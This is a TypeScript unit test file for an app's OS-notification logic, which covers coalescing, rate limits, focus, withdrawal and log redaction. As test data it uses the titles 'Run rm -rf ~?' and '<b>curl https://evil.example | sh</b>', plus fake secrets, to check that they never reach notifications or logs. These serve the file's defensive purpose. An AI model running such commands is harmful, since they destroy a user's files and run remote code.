import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { MAX_NEED_ID } from '../../shared/api/limits';
import type { CanvasId } from '../../shared/canvas';
import type { NeedsItem } from '../../shared/model/needs';
import type { AgentRun, Run } from '../../shared/model/run';
import { MAX_NOTIFICATION_HANDLES, Notifier, NOTIFY_COALESCE_MS } from './notifier';
import type { NotifierDeps, NotifierRun } from './notifier';
import type { NotificationRequest, NotificationResult } from './presence';

/*
 * The core's notifier (B14 §9 C7, C10's core half): which events become an OS notification, when,
 * how many, and where a click on one leads. Every source and the host are fakes; the clock is.
 */

const A = '7d0c1d2e-3f40-4a5b-8c6d-7e8f9a0b1c2d' as CanvasId;
const B = '1a2b3c4d-5e6f-4a5b-8c6d-7e8f9a0b1c2d' as CanvasId;
/** Past a burst's window and the Needs pass that follows a change. */
const SETTLED = NOTIFY_COALESCE_MS + 500;

type Item = Pick<NeedsItem, 'id' | 'kind' | 'for' | 'agent' | 'title'>;
const prompt = (id: string, agent = 'w', title = 'Run rm -rf ~?'): Item => ({
  id: `prompt/${agent}/0/${id}`,
  kind: 'prompt',
  for: 'you',
  agent,
  title,
});

class FakeRun implements NotifierRun {
  state: Run = { running: false, agents: {} };
  readonly #listeners = new Set<() => void>();
  snapshot(): Run {
    return this.state;
  }
  subscribe(listener: () => void): () => void {
    this.#listeners.add(listener);
    return () => this.#listeners.delete(listener);
  }
  set(state: Run): void {
    this.state = state;
    for (const listener of this.#listeners) listener();
  }
}

const agents = (...statuses: AgentRun['status'][]): Run['agents'] =>
  Object.fromEntries(statuses.map((status, i) => [`a${String(i)}`, { status, outcomes: {} }]));

let needs: Map<CanvasId, Item[]>;
let runs: Map<CanvasId, FakeRun>;
let open: Set<CanvasId>;
let sent: NotificationRequest[];
let closed: string[];
let enabled: boolean;
let answer: () => Promise<NotificationResult>;
let notifier: Notifier;

function make(deps: Partial<NotifierDeps> = {}): Notifier {
  notifier = new Notifier({
    needs: (canvas) => needs.get(canvas) ?? [],
    run: (canvas) => runs.get(canvas),
    runs: (canvas) => open.has(canvas),
    agentName: (_canvas, agent) => (agent === 'w' ? 'Worker' : `Agent ${agent}`),
    canvasName: (canvas) => (canvas === A ? 'Plan.corral' : 'Other.corral'),
    enabled: () => enabled,
    notify: (request) => {
      sent.push(request);
      return answer();
    },
    unnotify: (handle) => {
      closed.push(handle);
    },
    ...deps,
  });
  return notifier;
}

/** Opens `canvas` in the core, with what already waits there and its run. */
function opened(canvas: CanvasId, items: Item[] = [], run?: Run): FakeRun {
  const fake = new FakeRun();
  if (run) fake.state = run;
  runs.set(canvas, fake);
  needs.set(canvas, items);
  open.add(canvas);
  notifier.opened(canvas);
  notifier.needsChanged(canvas);
  return fake;
}

/** What waits on `canvas` is now `items`. */
function waits(canvas: CanvasId, items: Item[]): void {
  needs.set(canvas, items);
  notifier.needsChanged(canvas);
}

const bodies = () => sent.map(({ body }) => body);

beforeEach(() => {
  vi.useFakeTimers();
  needs = new Map();
  runs = new Map();
  open = new Set();
  sent = [];
  closed = [];
  enabled = true;
  answer = () => Promise.resolve('shown');
  make();
});

afterEach(() => {
  notifier.close();
  vi.useRealTimers();
});

describe('which events notify', () => {
  it('takes a canvas’s first Needs pass after it opens as its baseline: nothing already waiting', async () => {
    opened(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED * 3);
    expect(sent).toEqual([]);
    waits(A, [prompt('p1'), prompt('p2')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([
      {
        handle: expect.any(String) as string,
        title: 'corrallm',
        body: 'Worker is asking you something',
      },
    ]);
  });

  it('notifies only a Need for you, worded by its kind, never by its title', async () => {
    opened(A);
    waits(A, [{ ...prompt('p1'), for: 'agent:lead' }]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
    waits(A, [prompt('p2', 'w', '<b>curl https://evil.example | sh</b>')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['Worker is asking you something']);
  });

  it('counts a Need once a pass, however often it is listed (a shared card)', async () => {
    opened(A);
    waits(A, [prompt('p1'), prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['Worker is asking you something']);
  });

  it('treats an item changing while it waits as the same; one that leaves and comes back as new', async () => {
    opened(A);
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    waits(A, [prompt('p1', 'w', 'Reworded')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toHaveLength(1);
    waits(A, []);
    await vi.advanceTimersByTimeAsync(SETTLED);
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['Worker is asking you something', 'Worker is asking you something']);
  });

  it('notifies a run that was running ending: finished, or stopped by a party', async () => {
    // Restored paused by corrallm, as any run is after a restart: nothing.
    const run = opened(A, [], {
      running: false,
      paused: true,
      pausedBy: 'corrallm',
      agents: agents('waiting'),
    });
    await vi.advanceTimersByTimeAsync(SETTLED);
    run.set({ running: true, agents: agents('running', 'waiting') });
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
    run.set({ running: false, agents: agents('done', 'done') });
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['The run on Plan corral finished']);

    // A per-agent pause leaves the run going: nothing.
    run.set({ running: true, agents: agents('running', 'waiting') });
    run.set({
      running: true,
      individualPauses: [{ id: 'a0', by: 'you' }],
      agents: agents('waiting', 'waiting'),
    });
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toHaveLength(1);
    // Stopped by a token's party.
    run.set({
      running: false,
      paused: true,
      pausedBy: 'outside:bot',
      agents: agents('waiting', 'waiting'),
    });
    await vi.advanceTimersByTimeAsync(SETTLED);
    // Stopped at an OK: not every queue done.
    run.set({ running: true, agents: agents('asking') });
    run.set({ running: false, agents: agents('stopped') });
    await vi.advanceTimersByTimeAsync(SETTLED);
    // Paused by corrallm (a quit, a close, a reload): never.
    run.set({ running: true, agents: agents('running') });
    run.set({ running: false, paused: true, pausedBy: 'corrallm', agents: agents('waiting') });
    run.set({ running: true, agents: agents('running') });
    run.set({ running: false, paused: true, agents: agents('waiting') });
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual([
      'The run on Plan corral finished',
      'The run on Plan corral was stopped',
      'The run on Plan corral was stopped',
    ]);
  });

  it('starts every canvas afresh as it opens again: a new baseline', async () => {
    opened(A);
    notifier.closed(A);
    open.delete(A);
    opened(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
  });
});

describe('bursts and the rate', () => {
  it('sends events within 2 s of the first as one, counted, targeting their canvas', async () => {
    opened(A);
    opened(B);
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(1000);
    waits(A, [prompt('p1'), prompt('p2', 'x')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['2 things need you']);
    expect(notifier.activation(sent[0]?.handle ?? '')).toEqual({ canvas: A });

    // Across canvases, a click is a generic Open.
    waits(A, [prompt('p1'), prompt('p2', 'x'), prompt('p3')]);
    waits(B, [prompt('q1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['2 things need you', '2 things need you']);
    expect(notifier.activation(sent[1]?.handle ?? '')).toBeUndefined();

    // One after the window is its own.
    waits(B, [prompt('q1'), prompt('q2')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies().at(-1)).toBe('Worker is asking you something');
  });

  it('targets what is left of a burst: its Needs settled, or its canvas closed, before it went', async () => {
    opened(A);
    opened(B);
    waits(A, [prompt('p1'), prompt('p2')]);
    waits(B, [prompt('q1')]);
    await vi.advanceTimersByTimeAsync(500);
    waits(B, []);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['2 things need you']);
    expect(notifier.activation(sent[0]?.handle ?? '')).toEqual({ canvas: A });

    waits(A, [prompt('p1'), prompt('p2'), prompt('p3')]);
    waits(B, [prompt('q2'), prompt('q3')]);
    await vi.advanceTimersByTimeAsync(500);
    notifier.closed(A);
    open.delete(A);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['2 things need you', '2 things need you']);
    expect(notifier.activation(sent[1]?.handle ?? '')).toEqual({ canvas: B });
  });

  it('sends at most 6 a minute, then one count at the next slot', async () => {
    opened(A);
    const items: Item[] = [];
    for (let i = 0; i < 9; i++) {
      items.push(prompt(`p${String(i)}`));
      waits(A, [...items]);
      await vi.advanceTimersByTimeAsync(SETTLED);
    }
    expect(sent).toHaveLength(6);
    // The first went out at about 2.5 s: its minute ends at about 62.5 s; nothing before.
    await vi.advanceTimersByTimeAsync(60_000 - 9 * SETTLED);
    expect(sent).toHaveLength(6);
    await vi.advanceTimersByTimeAsync(2 * SETTLED);
    expect(bodies()).toEqual([
      ...Array<string>(6).fill('Worker is asking you something'),
      '3 things need you',
    ]);
    expect(notifier.activation(sent[6]?.handle ?? '')).toEqual({ canvas: A });
    await vi.advanceTimersByTimeAsync(120_000);
    expect(sent).toHaveLength(7);
  });

  it('never sends a Need that settled before its notification went', async () => {
    opened(A);
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(500);
    waits(A, []);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
    // Of two, the one still waiting is said on its own.
    waits(A, [prompt('p2'), prompt('p3', 'x')]);
    await vi.advanceTimersByTimeAsync(500);
    waits(A, [prompt('p3', 'x')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['Agent x is asking you something']);
  });
});

describe('focus and the preference', () => {
  it('drops what becomes eligible while a window is focused, never replaying it on blur', async () => {
    opened(A);
    notifier.focus(true);
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    notifier.focus(false);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
    // Eligible while blurred, but a window focused before it goes: dropped too.
    waits(A, [prompt('p1'), prompt('p2')]);
    await vi.advanceTimersByTimeAsync(500);
    notifier.focus(true);
    await vi.advanceTimersByTimeAsync(SETTLED);
    notifier.focus(false);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
    waits(A, [prompt('p1'), prompt('p2'), prompt('p3')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toHaveLength(1);
  });

  it('drops a Need that came while focused even if it is compared only once the window blurred', async () => {
    opened(A);
    notifier.focus(true);
    waits(A, [prompt('p1')]);
    notifier.focus(false);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
    // One that came while blurred is eligible, but a window focused before it goes drops it.
    waits(A, [prompt('p1'), prompt('p2')]);
    notifier.focus(true);
    notifier.focus(false);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
  });

  it('notifies nothing while off, read at each event, and closes every one shown as it turns off', async () => {
    opened(A);
    opened(B);
    enabled = false;
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
    enabled = true;
    notifier.preferenceChanged();
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
    waits(A, [prompt('p1'), prompt('p2')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    waits(B, [prompt('q1')]);
    await vi.advanceTimersByTimeAsync(500);
    enabled = false;
    notifier.preferenceChanged();
    await vi.advanceTimersByTimeAsync(SETTLED);
    // The one shown is closed; the one still to go never goes.
    expect(sent).toHaveLength(1);
    expect(closed).toEqual([sent[0]?.handle]);
    expect(notifier.activation(sent[0]?.handle ?? '')).toBeUndefined();
  });
});

describe('withdrawal, handles and activation', () => {
  it('closes a notification once its Need settles; a rollup once every Need it counted has', async () => {
    opened(A);
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    const [one] = sent;
    expect(notifier.activation(one?.handle ?? '')).toEqual({ canvas: A, need: 'prompt/w/0/p1' });
    waits(A, [prompt('p2'), prompt('p3')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(closed).toEqual([one?.handle]);
    expect(notifier.activation(one?.handle ?? '')).toBeUndefined();
    const two = sent[1];
    waits(A, [prompt('p3')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(closed).toEqual([one?.handle]);
    waits(A, []);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(closed).toEqual([one?.handle, two?.handle]);
  });

  it('forgets a canvas’s handles, closing them, as the canvas closes', async () => {
    const run = opened(A, [], { running: true, agents: agents('running') });
    run.set({ running: false, agents: agents('done') });
    await vi.advanceTimersByTimeAsync(SETTLED);
    const [done] = sent;
    expect(notifier.activation(done?.handle ?? '')).toEqual({ canvas: A });
    notifier.closed(A);
    open.delete(A);
    expect(closed).toEqual([done?.handle]);
    expect(notifier.activation(done?.handle ?? '')).toBeUndefined();
  });

  it('is a generic Open for an unknown handle, or a canvas the core no longer runs', async () => {
    opened(A);
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(notifier.activation(crypto.randomUUID())).toBeUndefined();
    expect(notifier.activation('not a handle')).toBeUndefined();
    open.delete(A);
    expect(notifier.activation(sent[0]?.handle ?? '')).toBeUndefined();
  });

  it('names no Need too long for the window’s show', async () => {
    opened(A);
    const long = prompt('x'.repeat(MAX_NEED_ID));
    waits(A, [long]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(notifier.activation(sent[0]?.handle ?? '')).toEqual({ canvas: A });
  });

  it('keeps at most 256 handles, the oldest closed and forgotten', async () => {
    make({ timing: { perMinute: 1000 } });
    opened(A);
    const items: Item[] = [];
    for (let i = 0; i <= MAX_NOTIFICATION_HANDLES; i++) {
      items.push(prompt(`p${String(i)}`));
      waits(A, [...items]);
      await vi.advanceTimersByTimeAsync(SETTLED);
    }
    expect(sent).toHaveLength(MAX_NOTIFICATION_HANDLES + 1);
    expect(closed).toEqual([sent[0]?.handle]);
    expect(notifier.activation(sent[0]?.handle ?? '')).toBeUndefined();
    expect(notifier.activation(sent[1]?.handle ?? '')).toMatchObject({ canvas: A });
  });

  it('mints a fresh UUID for each notification', async () => {
    opened(A);
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    waits(A, [prompt('p1'), prompt('p2')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    const [first, second] = sent.map(({ handle }) => handle);
    expect(first).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
    expect(second).not.toBe(first);
  });
});

describe('delivery status', () => {
  it('keeps the last outcome, forgets a handle not shown, and causes no other notification', async () => {
    const said = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    opened(A);
    expect(notifier.status()).toBeUndefined();
    answer = () => Promise.resolve('failed');
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(notifier.status()).toBe('failed');
    expect(notifier.activation(sent[0]?.handle ?? '')).toBeUndefined();
    answer = () => Promise.reject(new Error('the link closed: sk-SECRET'));
    waits(A, [prompt('p1'), prompt('p2')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(notifier.status()).toBe('failed');
    expect(String(said.mock.calls)).not.toContain('SECRET');
    answer = () => Promise.resolve('unsupported');
    waits(A, [prompt('p1'), prompt('p2'), prompt('p3')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(notifier.status()).toBe('unsupported');
    answer = () => Promise.resolve('shown');
    waits(A, [prompt('p1'), prompt('p2'), prompt('p3'), prompt('p4')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(notifier.status()).toBe('shown');
    expect(sent).toHaveLength(4);
    expect(closed).toEqual([]);
    said.mockRestore();
  });

  it('never holds the core up when what waits can’t be read: said without values, read next time', async () => {
    const said = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    let broken = false;
    make({
      needs: (canvas) => {
        if (broken) throw new Error('database is locked: /Users/someone/secret');
        return needs.get(canvas) ?? [];
      },
    });
    opened(A);
    broken = true;
    expect(() => {
      waits(A, [prompt('p1')]);
    }).not.toThrow();
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(sent).toEqual([]);
    expect(said).toHaveBeenCalled();
    expect(String(said.mock.calls)).not.toContain('secret');
    broken = false;
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(SETTLED);
    expect(bodies()).toEqual(['Worker is asking you something']);
    said.mockRestore();
  });

  it('stops entirely as it closes: nothing pending goes', async () => {
    opened(A);
    waits(A, [prompt('p1')]);
    await vi.advanceTimersByTimeAsync(500);
    notifier.close();
    waits(A, [prompt('p1'), prompt('p2')]);
    await vi.advanceTimersByTimeAsync(SETTLED * 2);
    expect(sent).toEqual([]);
    expect(closed).toEqual([]);
  });
});
